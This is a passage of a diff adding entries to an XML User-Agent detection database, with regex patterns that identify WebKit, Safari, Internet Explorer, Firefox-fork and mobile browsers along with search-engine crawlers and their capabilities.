+  <Identification Type="Header" Name="User-Agent" Match="Android\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match="Android\s\d+\.\d+(\.\d+)?;\s(?'deviceID'[^)]*)" />
+  <Capability Name="browser" Value="Android" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+  <Child Id="993" Name="AppleWebKitChrome2" Type="Browser" />
+  <Child Id="1153" Name="ChromeFail1" Type="Browser" />
+  <Child Id="1169" Name="Opera WebKit1" Type="Browser" />
+</Browser>
+<Browser Id="913" ParentId="851" Prority="" Name="AppleWebKitBasic2">
+  <Identification Type="Header" Name="User-Agent" Match="\(KHTML,\slike\sGecko\)\sVersion/(?'version'\d+\.\d+(\.\d+)?)\s(?'browser'[^/\d]*)" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="994" Name="AppleWebKitMobile" Type="Browser" />
+  <Child Id="1155" Name="AppleWebKitMobileiPad" Type="Browser" />
+  <Child Id="995" Name="AppleWebKitMobileiPhone" Type="Browser" />
+  <Child Id="996" Name="AppleWebKitMobileiPod" Type="Browser" />
+</Browser>
+<Browser Id="914" ParentId="851" Prority="" Name="AppleWebKitBasic3">
+  <Identification Type="Header" Name="User-Agent" Match="\(KHTML,\slike\sGecko\)\s(?'browser'[^/\d]*)/(?'version'\d+(\.\d+(\.\d+)?)?)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="\(KHTML,\slike\sGecko\)\sVersion/\d+\.\d+" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="^Mozilla/5\.0\s\(SymbianOS" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="1031" Name="BingPreview" Type="Browser" />
+  <Child Id="1146" Name="EdgA" Type="Browser" />
+  <Child Id="1147" Name="Edge" Type="Browser" />
+  <Child Id="1175" Name="FxiOS" Type="Browser" />
+  <Child Id="1030" Name="NintendoBrowser" Type="Browser" />
+  <Child Id="997" Name="Safari0001" Type="Browser" />
+  <Child Id="998" Name="Safari0002" Type="Browser" />
+  <Child Id="999" Name="Safari0003" Type="Browser" />
+  <Child Id="1000" Name="Safari0004" Type="Browser" />
+  <Child Id="1001" Name="Safari0005" Type="Browser" />
+  <Child Id="1002" Name="Safari0006" Type="Browser" />
+  <Child Id="1003" Name="Safari0007" Type="Browser" />
+  <Child Id="1004" Name="Safari0008" Type="Browser" />
+  <Child Id="1005" Name="Safari0009" Type="Browser" />
+  <Child Id="1006" Name="Safari0010" Type="Browser" />
+  <Child Id="1007" Name="Safari0011" Type="Browser" />
+  <Child Id="1008" Name="Safari0012" Type="Browser" />
+  <Child Id="1009" Name="Safari0013" Type="Browser" />
+  <Child Id="1010" Name="Safari0014" Type="Browser" />
+  <Child Id="1011" Name="Safari0015" Type="Browser" />
+  <Child Id="1012" Name="Safari0016" Type="Browser" />
+  <Child Id="1013" Name="Safari0017" Type="Browser" />
+  <Child Id="1014" Name="Safari0018" Type="Browser" />
+  <Child Id="1015" Name="Safari0019" Type="Browser" />
+  <Child Id="1016" Name="Safari0020" Type="Browser" />
+  <Child Id="1017" Name="Safari0021" Type="Browser" />
+  <Child Id="1018" Name="Safari0022" Type="Browser" />
+  <Child Id="1019" Name="Safari0023" Type="Browser" />
+  <Child Id="1020" Name="Safari0026" Type="Browser" />
+  <Child Id="1021" Name="Safari0027" Type="Browser" />
+  <Child Id="1022" Name="Safari0028" Type="Browser" />
+  <Child Id="1023" Name="Safari0029" Type="Browser" />
+  <Child Id="1024" Name="Safari0030" Type="Browser" />
+  <Child Id="1025" Name="Safari0031" Type="Browser" />
+  <Child Id="1026" Name="Safari0033" Type="Browser" />
+  <Child Id="1027" Name="Safari0036" Type="Browser" />
+  <Child Id="1028" Name="Safari0039" Type="Browser" />
+  <Child Id="1029" Name="Safari0040" Type="Browser" />
+</Browser>
+<Browser Id="915" ParentId="851" Prority="" Name="AppleWebKitSymbianOS">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413 es65" />
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s\(SymbianOS/\d\.\d;\sU;" />
+  <Capture Type="Header" Name="User-Agent" Match="SymbianOS/(?'OSversion'\d+\.\d+)" />
+  <Capability Name="browser" Value="Nokia Browser" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="isMobileDevice" Value="True" />
+  <Capability Name="OS" Value="SymbianOS ${OSversion}" />
+  <Child Id="1032" Name="AppleWebKitSymbianOSNokia" Type="Browser" />
+  <Child Id="1134" Name="AppleWebKitSymbianOSNokia2" Type="Browser" />
+</Browser>
+<Browser Id="916" ParentId="851" Prority="" Name="OmniWebAppleWebKit">
+  <Identification Type="Header" Name="User-Agent" Match="OmniWeb" />
+  <Capability Name="browser" Value="OmniWeb" />
+  <Capability Name="version" Value="4.5" />
+  <Child Id="1033" Name="OmniWebv496" Type="Browser" />
+  <Child Id="1034" Name="OmniWebv558" Type="Browser" />
+  <Child Id="1035" Name="OmniWebv563" Type="Browser" />
+  <Child Id="1036" Name="OmniWebv607" Type="Browser" />
+  <Child Id="1037" Name="OmniWebv613" Type="Browser" />
+</Browser>
+<Browser Id="917" ParentId="851" Prority="" Name="AppleWebKitChrome">
+  <Identification Type="Header" Name="User-Agent" Match="Chrome/(?'version'\d+\.\d+(\.\d+)?)(\.\d+)?\s(Mobile\s)?Safari/\d+\.\d+" />
+  <Capability Name="browser" Value="Chrome" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="1039" Name="GooglePageSpeedInsights" Type="Browser" />
+  <Child Id="1038" Name="GoogleWebPreview" Type="Browser" />
+</Browser>
+<Browser Id="918" ParentId="851" Prority="" Name="Arora">
+  <Identification Type="Header" Name="User-Agent" Match="Arora/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Arora" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="919" ParentId="851" Prority="" Name="SafariFaceBook">
+  <Identification Type="Header" Name="User-Agent" Match="FBAN/FBIOS" />
+  <Capability Name="browser" Value="Mobile Safari" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="isMobileDevice" Value="true" />
+</Browser>
+<Browser Id="920" ParentId="852" Prority="" Name="LegalAnalysisAgent">
+  <Identification Type="Header" Name="User-Agent" Match="LegalAnalysisAgent/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="LegalAnalysisAgent" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="921" ParentId="852" Prority="" Name="WebMasterAid">
+  <Identification Type="Header" Name="User-Agent" Match="WebMasterAid/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="WebMasterAid" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="true" />
+</Browser>
+<Browser Id="922" ParentId="852" Prority="" Name="NetcraftSurveyAgent">
+  <Identification Type="Header" Name="User-Agent" Match="NetcraftSurveyAgent" />
+  <Capture Type="Header" Name="User-Agent" Match="NetcraftSurveyAgent/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="browser" Value="NetcraftSurveyAgent" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="923" ParentId="852" Prority="" Name="SiteExplorer">
+  <Identification Type="Header" Name="User-Agent" Match="SiteExplorer/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="browser" Value="SiteExplorer" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="924" ParentId="853" Prority="0" Name="Mozilla_Trident5">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/5\.0" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="9.0" />
+  <Capability Name="layoutEngineVersion" Value="5.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+</Browser>
+<Browser Id="925" ParentId="853" Prority="0" Name="Mozilla_Trident6">
+  <Identification Type="Header" Name="User-Agent" Match="Trident/6\.0" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Capability Name="version" Value="10.0" />
+  <Capability Name="layoutEngine" Value="Trident" />
+  <Capability Name="layoutEngineVersion" Value="6.0" />
+  <Child Id="1040" Name="IEMobile3" Type="Browser" />
+</Browser>
+<Browser Id="926" ParentId="853" Prority="1" Name="Mozilla X Malformed4">
+  <Identification Type="Header" Name="User-Agent" Match="MSIE\s\d+\.\d+" />
+  <Identification Type="capability" Name="browser" Match="MSIE" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="927" ParentId="856" Prority="" Name="MSIEMozilla4CompatibleB">
+  <Identification Type="capability" Name="browser" Match="MSIE" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="\)\sOpera\s\d+\.\d+" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="^Mozilla/4\.0\s\(compatible;\sMSIE\s\d\.\d{1,2}\w{0,1};?\)" />
+  <Identification Type="Header" Name="User-Agent" NonMatch="^Mozilla/4\.0\s\(compatible;\sMSIE\s\d\.\d{1,2}\w{0,1};\s(Windows NT(;?)\)|Windows XP(;?)\)|Windows 2000(;?)\)|Windows ME(;?)\))" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Child Id="1045" Name="IE10Compatible" Type="Browser" />
+  <Child Id="1046" Name="IE11Compatible" Type="Browser" />
+  <Child Id="1043" Name="IE8Compatible" Type="Browser" />
+  <Child Id="1044" Name="IE9Compatible" Type="Browser" />
+  <Child Id="1042" Name="MSIENokia" Type="Browser" />
+  <Child Id="1041" Name="WINCE4" Type="Browser" />
+</Browser>
+<Browser Id="928" ParentId="857" Prority="" Name="Malformed6">
+  <Identification Type="Header" Name="User-Agent" Match="\s\sMSIE\s\d+\.\d+" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="929" ParentId="862" Prority="" Name="MSIEMozilla2CompatibleB">
+  <Identification Type="capability" Name="browser" Match="MSIE" />
+  <Capability Name="browser" Value="Microsoft Internet Explorer" />
+  <Child Id="1047" Name="WINCE2" Type="Browser" />
+</Browser>
+<Browser Id="930" ParentId="873" Prority="" Name="UPBrowserSAMSUNG">
+  <Identification Type="Header" Name="User-Agent" Match="((?i:Samsung)|SEC|SGH|SCH)-(?'Model'[^/|^\s]*)" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+  <Capability Name="mobileDeviceModel" Value="${Model}" />
+</Browser>
+<Browser Id="931" ParentId="873" Prority="" Name="UPBrowserSAGEM">
+  <Identification Type="Header" Name="User-Agent" Match="^SAGEM-(?'Model'[^/]*)" />
+  <Capability Name="mobileDeviceManufacturer" Value="SAGEM" />
+  <Capability Name="mobileDeviceModel" Value="${Model}" />
+</Browser>
+<Browser Id="932" ParentId="873" Prority="" Name="UPBrowserMOT">
+  <Identification Type="capability" Name="mobileDeviceModel" Match="MOT-" />
+  <Capability Name="mobileDeviceManufacturer" Value="Motorola" />
+</Browser>
+<Gateway Id="933" ParentId="879" Prority="" Name="IEMobileMozilla">
+  <Identification Type="Header" Name="User-Agent" Match="IEMobile (?'versionString'(?'browserMajorVersion'\d+)\.(?'browserMinorVersion'\d+))" />
+  <Capability Name="version" Value="${versionString}" />
+</Gateway>
+<Browser Id="934" ParentId="879" Prority="" Name="SAMSUNGAUPOCKET">
+  <Identification Type="Header" Name="User-Agent" Match="Samsung-(?'Model'[^\s]*)|Samsung-(?'Model'[^/]*)|SAMSUNG-(?'Model'[^/]*)|SEC-(?'Model'[^/]*)|SGH-(?'Model'[^/]*)|SCH-(?'Model'[^/]*)" />
+  <Capability Name="mobileDeviceManufacturer" Value="Samsung" />
+  <Capability Name="mobileDeviceModel" Value="${Model}" />
+</Browser>
+<Browser Id="935" ParentId="879" Prority="" Name="POCKETIEModel">
+  <Identification Type="Header" Name="User-Agent" Match="(?'deviceID'HTC[_-][^/|^\s]*)|(?'deviceID'Qtek[_-][^/|^\s]*)|(?'deviceID'Palm[^/|^\s]*)" />
+  <Capability Name="mobileDeviceModel" Value="${deviceID}" />
+</Browser>
+<Browser Id="936" ParentId="881" Prority="" Name="MSIECrawler">
+  <Identification Type="Header" Name="User-Agent" Match="MSIECrawler" />
+  <Identification Type="Header" Name="User-Agent" Match="MSIE\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="IE Crawler" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="937" ParentId="881" Prority="" Name="MSSearch">
+  <Identification Type="Header" Name="User-Agent" Match="MSIECrawler" />
+  <Identification Type="Header" Name="User-Agent" Match="MS Search\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="MS Search" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="938" ParentId="881" Prority="" Name="MSNBOT_Mobile">
+  <Identification Type="Header" Name="User-Agent" Match="MSNBOT_Mobile" />
+  <Capability Name="browser" Value="MSNBOT_Mobile" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="939" ParentId="881" Prority="" Name="ScanAlert">
+  <Identification Type="Header" Name="User-Agent" Match="ScanAlert" />
+  <Capability Name="browser" Value="ScanAlert" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="940" ParentId="883" Prority="" Name="Nutch">
+  <Identification Type="Header" Name="User-Agent" Match="Nutch" />
+  <Capability Name="browser" Value="Nutch" />
+</Browser>
+<Browser Id="941" ParentId="883" Prority="" Name="Charlotte">
+  <Identification Type="Header" Name="User-Agent" Match="[Cc]harlotte|beta.spider@gmail.com|betaspider.com" />
+  <Capability Name="browser" Value="Charlotte" />
+</Browser>
+<Browser Id="942" ParentId="883" Prority="" Name="Exabot">
+  <Identification Type="Header" Name="User-Agent" Match="Exabot" />
+  <Capture Type="Header" Name="User-Agent" Match="Exabot/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="Exabot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="943" ParentId="883" Prority="" Name="IBMResearchWebCrawler">
+  <Identification Type="Header" Name="User-Agent" Match="http\:\/\/www\.almaden.ibm.com\/cs\/crawler" />
+  <Capability Name="browser" Value="IBMResearchWebCrawler" />
+</Browser>
+<Browser Id="944" ParentId="883" Prority="" Name="WISEnutbot">
+  <Identification Type="Header" Name="User-Agent" Match="ZyBorg/" />
+  <Capability Name="browser" Value="WISEnutbot" />
+</Browser>
+<Browser Id="945" ParentId="883" Prority="" Name="GoogleBot">
+  <Identification Type="Header" Name="User-Agent" Match="Googlebot/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Googlebot" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="946" ParentId="883" Prority="" Name="iaarchiver">
+  <Identification Type="Header" Name="User-Agent" Match="^ia_archiver" />
+  <Capability Name="browser" Value="ia_archiver" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="isMobileDevice" Value="False" />
+</Browser>
+<Browser Id="947" ParentId="883" Prority="" Name="IRLbot">
+  <Identification Type="Header" Name="User-Agent" Match="^IRLbot/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="IRLbot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="948" ParentId="883" Prority="" Name="MJ12bot">
+  <Identification Type="Header" Name="User-Agent" Match="MJ12bot/v(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match=";\sident=(?'Ident'\w*)\)" />
+  <Capture Type="Header" Name="Crawler-Ident" Match="(?'Ident'\w*)" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="browser" Value="MJ12bot" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="ident" Value="${Ident}" />
+</Browser>
+<Browser Id="949" ParentId="883" Prority="" Name="heritrix">
+  <Identification Type="Header" Name="User-Agent" Match="heritrix" />
+  <Capture Type="Header" Name="User-Agent" Match="heritrix/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="heritrix" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="950" ParentId="883" Prority="" Name="libwwwperl">
+  <Identification Type="Header" Name="User-Agent" Match="libwww-perl" />
+  <Capture Type="Header" Name="User-Agent" Match="libwww-perl/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="libwww-perl" />
+  <Capability Name="version" Value="${version}" />
+  <Child Id="1048" Name="W3Cchecklink" Type="Browser" />
+</Browser>
+<Browser Id="951" ParentId="883" Prority="" Name="JakartaCommonsHttpClient">
+  <Identification Type="Header" Name="User-Agent" Match="Jakarta\sCommons-HttpClient" />
+  <Capture Type="Header" Name="User-Agent" Match="Jakarta\sCommons-HttpClient/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="Jakarta Commons-HttpClient" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="952" ParentId="883" Prority="" Name="Girafabot">
+  <Identification Type="Header" Name="User-Agent" Match="Girafabot" />
+  <Capability Name="browser" Value="Girafabot" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="953" ParentId="883" Prority="" Name="AskJeeves">
+  <Identification Type="Header" Name="User-Agent" Match="Ask Jeeves" />
+  <Capability Name="browser" Value="Ask Jeeves" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="954" ParentId="883" Prority="" Name="larbin">
+  <Identification Type="Header" Name="User-Agent" Match="larbin" />
+  <Capability Name="browser" Value="larbin" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="955" ParentId="883" Prority="" Name="HTTrack">
+  <Identification Type="Header" Name="User-Agent" Match="HTTrack" />
+  <Capture Type="Header" Name="User-Agent" Match="HTTrack\s(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capture Type="Header" Name="User-Agent" Match="HTTrack/(?'version'(?'major'\d+)\.(?'minor'\d+(\.\d+)?))" />
+  <Capability Name="browser" Value="HTTrack" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="956" ParentId="883" Prority="" Name="IndyLibrary">
+  <Identification Type="Header" Name="User-Agent" Match="Indy Library" />
+  <Capability Name="browser" Value="HTTrack" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="957" ParentId="883" Prority="" Name="Slurp">
+  <Identification Type="Header" Name="User-Agent" Match="Slurp" />
+  <Capability Name="browser" Value="Yahoo Slurp" />
+  <Capability Name="version" Value="0.0" />
+  <Child Id="1049" Name="Slurp3" Type="Browser" />
+  <Child Id="1050" Name="SlurpChina" Type="Browser" />
+</Browser>
+<Browser Id="958" ParentId="883" Prority="" Name="YahooMMCrawler">
+  <Identification Type="Header" Name="User-Agent" Match="Yahoo-MMCrawler/(?'version'\d+)" />
+  <Capability Name="browser" Value="Yahoo MMCrawler" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="959" ParentId="883" Prority="" Name="WukongBot">
+  <Identification Type="Header" Name="User-Agent" Match="WukongBot" />
+  <Capability Name="browser" Value="WukongBot" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="960" ParentId="883" Prority="" Name="YodaoBot">
+  <Identification Type="Header" Name="User-Agent" Match="YodaoBot/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="YodaoBot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="961" ParentId="883" Prority="" Name="Baiduspider">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" />
+  <Identification Type="Header" Name="User-Agent" Match="(?i:Baiduspider)|baidu.com" />
+  <Capture Type="Header" Name="User-Agent" Match="Baiduspider/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Baiduspider" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="962" ParentId="883" Prority="" Name="VoilaBot">
+  <Identification Type="Header" Name="User-Agent" Match="VoilaBot\s(?'version'\d+\.\d+(\.\d+)?)|VoilaBot BETA\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="VoilaBot" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="963" ParentId="883" Prority="" Name="Twicelerpider1">
+  <Identification Type="Header" Name="User-Agent" Match="Twiceler-(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Twiceler" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="964" ParentId="883" Prority="" Name="Twicelerpider2">
+  <Identification Type="Header" Name="User-Agent" Match="Twiceler\swww\.cuill\.com" />
+  <Capability Name="browser" Value="Twiceler" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="965" ParentId="883" Prority="" Name="YodaoBotMobile">
+  <Identification Type="Header" Name="User-Agent" Match="YodaoBot-Mobile/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="YodaoBot-Mobile" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="966" ParentId="883" Prority="" Name="YahooSeeker">
+  <Identification Type="Header" Name="User-Agent" Match="YahooSeeker/M1A1-R2D2" />
+  <Capability Name="browser" Value="YahooSeeker" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="967" ParentId="883" Prority="" Name="GooglebotMobile">
+  <Identification Type="Header" Name="User-Agent" Match="Googlebot-Mobile/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Googlebot-Mobile" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="968" ParentId="883" Prority="" Name="Malformed9">
+  <Identification Type="Header" Name="User-Agent" Match="Http_User_Agent" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="Malformed User-Agent" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="969" ParentId="883" Prority="" Name="AdsBotGoogle">
+  <Identification Type="Header" Name="User-Agent" Match="^AdsBot-Google" />
+  <Capability Name="browser" Value="AdsBot-Google" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="True" />
+</Browser>
+<Browser Id="970" ParentId="883" Prority="" Name="BaiduImagespider">
+  <Identification Type="Header" Name="User-Agent" Match="BaiduImagespider" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="BaiduImageSpider" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="971" ParentId="883" Prority="" Name="SnapPreviewBot">
+  <Identification Type="Header" Name="User-Agent" Match="SnapPreviewBot" />
+  <Capability Name="browser" Value="SnapPreviewBot" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="972" ParentId="883" Prority="" Name="yacybot">
+  <Identification Type="Header" Name="User-Agent" Match="yacybot" />
+  <Capability Name="browser" Value="yacybot" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="973" ParentId="883" Prority="" Name="gsacrawler">
+  <Identification Type="Header" Name="User-Agent" Match="gsa-crawler" />
+  <Capability Name="crawler" Value="True" />
+  <Capability Name="browser" Value="gsa-crawler" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Gateway Id="974" ParentId="883" Prority="" Name="OceanSpidersFixVersion1">
+  <Identification Type="capability" Name="version" NonMatch="\d+.\d+" />
+  <Capability Name="version" Value="0.0" />
+</Gateway>
+<Browser Id="975" ParentId="883" Prority="" Name="PetalBot">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" />
+  <Identification Type="Header" Name="User-Agent" Match="PetalBot" />
+  <Capability Name="browser" Value="PetalBot" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Gateway Id="976" ParentId="883" Prority="" Name="OceanSpidersFixVersion2">
+  <Samples Name="User-Agent" Value="Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" />
+  <Samples Name="User-Agent" Value="Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.0; +https://openai.com/gptbot)" />
+  <Identification Type="Header" Name="User-Agent" Match="compatible;\s(?'browser'.*[Bb]ot)/(?'version'\d+\.\d+);" />
+  <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+</Gateway>
+<Browser Id="977" ParentId="883" Prority="" Name="GooglebotNews">
+  <Identification Type="Header" Name="User-Agent" Match="^Googlebot-News" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="browser" Value="Googlebot-News" />
+  <Capability Name="version" Value="0.0" />
+</Browser>
+<Browser Id="978" ParentId="883" Prority="" Name="GooglebotMediapartnersoceanspiders">
+  <Identification Type="Header" Name="User-Agent" Match="Mediapartners-Google/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Mediapartners-Google" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="isMobileDevice" Value="false" />
+</Browser>
+<Browser Id="979" ParentId="883" Prority="" Name="BDCbot">
+  <Identification Type="Header" Name="User-Agent" Match="BDCbot/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="BDCbot" />
+  <Capability Name="version" Value="${version}" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="isMobileDevice" Value="false" />
+</Browser>
+<Browser Id="980" ParentId="908" Prority="" Name="FireFoxMobile">
+  <Identification Type="Header" Name="User-Agent" Match="^Mozilla/5\.0\s" />
+  <Identification Type="Header" Name="User-Agent" Match="rv:\d+\.\d+\)\sGecko/\d+\.\d+\sFirefox/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Identification Type="Header" Name="User-Agent" Match="Tablet;|Mobile;" />
+  <Capability Name="isMobileDevice" Value="True" />
+</Browser>
+<Browser Id="981" ParentId="908" Prority="" Name="Flock">
+  <Identification Type="Header" Name="User-Agent" Match="Flock/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Flock" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="982" ParentId="908" Prority="" Name="GoogleImageProxy">
+  <Identification Type="Header" Name="User-Agent" Match="via ggpht.com GoogleImageProxy" />
+  <Capability Name="browser" Value="GoogleImageProxy" />
+  <Capability Name="version" Value="0.0" />
+  <Capability Name="crawler" Value="true" />
+  <Capability Name="isMobileDevice" Value="false" />
+</Browser>
+<Browser Id="983" ParentId="909" Prority="" Name="MozillaCamino">
+  <Identification Type="capability" Name="browser" Match="Camino" />
+  <Capability Name="browser" Value="Mozilla Camino" />
+</Browser>
+<Browser Id="984" ParentId="909" Prority="" Name="MozillaBonEcho">
+  <Identification Type="capability" Name="browser" Match="BonEcho" />
+  <Capability Name="browser" Value="Firefox" />
+</Browser>
+<Browser Id="985" ParentId="909" Prority="" Name="MozillaMinefield">
+  <Identification Type="capability" Name="browser" Match="Minefield" />
+  <Capability Name="browser" Value="Firefox" />
+</Browser>
+<Browser Id="986" ParentId="909" Prority="" Name="MozillaPhoenix">
+  <Identification Type="capability" Name="browser" Match="Phoenix" />
+  <Capability Name="browser" Value="Firefox" />
+</Browser>
+<Browser Id="987" ParentId="909" Prority="" Name="MozillaEpiphany">
+  <Identification Type="capability" Name="browser" Match="Epiphany" />
+  <Capability Name="browser" Value="Mozilla Epiphany" />
+</Browser>
+<Browser Id="988" ParentId="909" Prority="" Name="DebianIceweasel">
+  <Identification Type="capability" Name="browser" Match="Iceweasel" />
+  <Capability Name="browser" Value="Firefox" />
+</Browser>
+<Browser Id="989" ParentId="909" Prority="" Name="MozillaFireFoxB">
+  <Identification Type="capability" Name="isMobileDevice" Match="False" />
+  <Identification Type="capability" Name="browser" NonMatch="Firefox" />
+  <Identification Type="Header" Name="User-Agent" Match="Firefox/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Firefox" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="990" ParentId="909" Prority="" Name="Shiretoko">
+  <Identification Type="Header" Name="User-Agent" Match="Shiretoko/(?'version'\d+\.\d+(\.\d+)?)|Shiretoko/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Firefox" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="991" ParentId="909" Prority="" Name="Namoroka">
+  <Identification Type="Header" Name="User-Agent" Match="Namoroka/(?'version'\d+\.\d+(\.\d+)?)|Namoroka/(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="Firefox" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="992" ParentId="909" Prority="" Name="GeckoFiresomething">
